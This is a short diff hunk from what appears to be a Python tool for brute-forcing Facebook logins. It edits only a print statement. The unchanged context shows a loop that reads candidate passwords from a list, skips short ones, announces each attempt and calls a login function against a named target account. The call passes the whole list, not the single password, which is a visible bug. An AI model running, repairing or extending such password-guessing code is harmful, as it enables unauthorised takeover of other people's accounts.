@@ -358,7 +358,7 @@ def Start():
         for passwd in passwords:
             passwd = passwd.strip()
             if len(passwd) <6:continue
-            print(f'{green}[{red}-{green}]{yellow} Trying Password:{white} {passwd} ==> \n')
+            print(f'{green}[{red}-{green}]{yellow} Trying Password:{white} {passwd}')
 
             Account = facebook.login(target, passwords)
             print(" ")
